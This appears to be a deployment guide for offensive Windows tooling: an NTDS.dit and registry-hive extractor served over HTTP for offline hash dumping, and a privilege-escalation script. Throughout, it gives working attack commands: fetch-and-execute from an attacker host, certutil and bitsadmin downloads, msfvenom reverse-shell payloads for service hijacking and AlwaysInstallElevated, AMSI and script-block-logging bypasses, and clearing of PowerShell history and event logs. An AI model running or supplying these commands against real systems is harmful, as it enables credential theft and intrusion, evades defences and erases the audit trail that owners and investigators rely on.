#This is for the ntds_extractor.ps1 

🌐 HTTP Server Integration:
After extraction, the script will prompt to start an HTTP server. On your Kali/attack machine:
bash# Download all files
wget http://<DC_IP>:8000/ntds.dit
wget http://<DC_IP>:8000/SYSTEM
wget http://<DC_IP>:8000/SAM

# Or one-liner
for f in ntds.dit SYSTEM SAM; do wget http://<DC_IP>:8000/$f; done

# Then extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

📋 Usage:
powershell# Extract + auto-start HTTP server
.\ntds_extractor.ps1 -ServeFiles

# With specific IP
.\ntds_extractor.ps1 -ServeFiles -ServeIP 10.10.14.5

# Custom port
.\ntds_extractor.ps1 -ServeFiles -ServePort 9000

# Extract only (no server prompt)
.\ntds_extractor.ps1 -ExtractOnly
```
# Windows Privilege Escalation Tool - Deployment Guide

## Quick Start

### On Attack Box (Kali/Linux)

```bash
# Step 1: Create working directory
mkdir -p /tmp/privesc && cd /tmp/privesc

# Step 2: Download this tool
# Option A: From your transfer method
# Option B: Host it on your attack box

# Step 3: Download automated tools (optional but recommended)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O winPEAS64.exe 2>/dev/null
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -O winPEAS32.exe 2>/dev/null
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -O PowerUp.ps1 2>/dev/null
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe -O Seatbelt.exe 2>/dev/null
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe -O LaZagne.exe 2>/dev/null
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 -O PrivescCheck.ps1 2>/dev/null

# Step 4: Start HTTP server
python3 -m http.server 8000
```

### On Target (Windows)

```powershell
# Method 1: Direct download and execute
iwr -uri http://ATTACKER_IP:8000/WinPrivEsc.ps1 -OutFile C:\Windows\Temp\e.ps1
powershell -ep bypass -f C:\Windows\Temp\e.ps1

# Method 2: In-memory execution (stealthier)
iex(iwr -uri http://ATTACKER_IP:8000/WinPrivEsc.ps1 -UseBasicParsing)

# Method 3: From existing shell
powershell -ep bypass
. .\WinPrivEsc.ps1
```

---

## Transfer Methods (No Internet on Target)

### Method 1: HTTP Server (Recommended)

**Attack Box:**
```bash
cd /directory/with/script
python3 -m http.server 8000
```

**Target:**
```powershell
# PowerShell
iwr -uri http://ATTACKER:8000/WinPrivEsc.ps1 -OutFile .\e.ps1

# certutil
certutil -urlcache -split -f http://ATTACKER:8000/WinPrivEsc.ps1 e.ps1

# bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER:8000/WinPrivEsc.ps1 C:\Windows\Temp\e.ps1
```

### Method 2: SMB Share

**Attack Box:**
```bash
# Using impacket
impacket-smbserver share /tmp/privesc -smb2support

# With authentication
impacket-smbserver share /tmp/privesc -smb2support -user test -password test
```

**Target:**
```powershell
# Direct copy
copy \\ATTACKER\share\WinPrivEsc.ps1 .\e.ps1

# With credentials
net use \\ATTACKER\share /user:test test
copy \\ATTACKER\share\WinPrivEsc.ps1 .\e.ps1
```

### Method 3: Base64 Encoding

**Attack Box:**
```bash
# Encode the script
base64 -w 0 WinPrivEsc.ps1 > encoded.txt
cat encoded.txt | xclip -selection clipboard
```

**Target:**
```powershell
# Decode and save
$encoded = "PASTE_BASE64_HERE"
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)) | Out-File .\e.ps1
```

### Method 4: Through Existing Shell (Copy/Paste)

For bind/reverse shells, copy script content directly into PowerShell ISE or use:

```powershell
# Create file through echo commands
echo 'SCRIPT_LINE_1' > e.ps1
echo 'SCRIPT_LINE_2' >> e.ps1
# ... continue for all lines
```

---

## Usage Modes

### Interactive Mode (Default)
```powershell
.\WinPrivEsc.ps1
# Follow prompts for IP, port, and mode selection
```

### Quick Mode (Basic Enumeration)
```powershell
.\WinPrivEsc.ps1 -Quick
```

### Full Mode (Everything + Automated Tools)
```powershell
.\WinPrivEsc.ps1 -Full -AttackerIP 10.10.14.1 -AttackerPort 8000
```

### Custom Output Location
```powershell
.\WinPrivEsc.ps1 -OutputPath C:\Windows\Temp\results
```

---

## What It Checks

### User & Group Enumeration
- Current user context and SID
- Group memberships (especially privileged groups)
- All local users and their status
- Members of Administrators, Remote Desktop Users, Remote Management Users
- Backup Operators and other sensitive groups

### Privilege Analysis
- Token privileges (SeImpersonate, SeBackup, SeDebug, etc.)
- Integrity level detection
- UAC configuration

### Service Vulnerabilities
- Unquoted service paths
- Writable service binaries
- Writable service directories
- Services running as domain/local users
- Service permission misconfigurations

### Scheduled Tasks
- Tasks running as SYSTEM/Administrator
- Writable task binaries
- Task metadata and schedules

### File System
- Sensitive files (passwords, keys, configs)
- PowerShell history (PSReadline)
- PowerShell transcripts
- Browser credential stores
- SSH keys
- DPAPI blobs

### Registry
- Autorun entries with writable paths
- AlwaysInstallElevated
- UAC bypass opportunities

### Network
- Active connections and listening ports
- Network configuration
- ARP cache
- Mapped drives and shares

### Security Products
- Antivirus/EDR detection
- Defender status and exclusions
- Running security processes

### System Information
- OS version and patch level
- Installed software
- Running processes
- Hotfix history

---

## Output Files

After execution, find these in the output directory:

| File | Contents |
|------|----------|
| `summary.txt` | Human-readable findings summary |
| `exploitation_guide.txt` | Attack vectors for high-priority findings |
| `full_results.json` | Complete structured data |
| `system_info.txt` | System and user details |
| `services.csv` | All services enumerated |
| `scheduled_tasks.csv` | Task details |
| `installed_software.csv` | Installed applications |

---

## Common Exploitation Paths

### SeImpersonatePrivilege
```powershell
# Check if enabled
whoami /priv | findstr "SeImpersonate"

# Exploit with PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell

# Or GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
```

### Unquoted Service Path
```powershell
# Identify the path break point
# Example: C:\Program Files\Vuln App\service.exe
# Writable point: C:\Program.exe

# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > Program.exe

# Copy and restart
copy Program.exe C:\Program.exe
sc stop VulnService
sc start VulnService
```

### Writable Service Binary
```powershell
# Backup original
copy "C:\path\to\service.exe" "C:\path\to\service.exe.bak"

# Replace with payload
copy payload.exe "C:\path\to\service.exe"

# Restart
sc stop ServiceName
sc start ServiceName
```

### AlwaysInstallElevated
```bash
# On attack box
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi
```

```powershell
# On target
msiexec /quiet /qn /i \\ATTACKER\share\shell.msi
```

### Credential Discovery
```powershell
# Check PSReadline history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Search for passwords in files
findstr /si password *.txt *.xml *.ini *.config

# Check stored credentials
cmdkey /list
```

---

## Evasion Tips

### AMSI Bypass (Run Before Script)
```powershell
# Method 1
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2 - If above blocked
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Failed"){$f=$e}};$f.SetValue($null,$true)
```

### Script Block Logging Bypass
```powershell
# Disable for current session
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'].Add('EnableScriptBlockLogging', '0')
```

### Execution Policy Bypass
```powershell
# Multiple methods
powershell -ep bypass -f script.ps1
powershell -exec bypass -c "iex(gc script.ps1 -raw)"
Set-ExecutionPolicy Bypass -Scope Process -Force
```

---

## Cleanup

```powershell
# Remove script and output
Remove-Item -Path .\e.ps1 -Force
Remove-Item -Path $env:TEMP\PrivEsc_* -Recurse -Force

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

# Clear event logs (requires admin)
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

---

## Troubleshooting

### Script Won't Run
```powershell
# Check execution policy
Get-ExecutionPolicy -List

# Bypass
powershell -ep bypass -f .\script.ps1
```

### Access Denied Errors
- Script runs with current user privileges
- Some checks require admin rights
- Tool will skip inaccessible items and continue

### Tool Downloads Fail
- Verify attack box server is running
- Check firewall rules
- Try alternative transfer methods (SMB, base64)

### Defender Blocks Execution
- Use AMSI bypass first
- Consider obfuscation
- Run individual checks manually
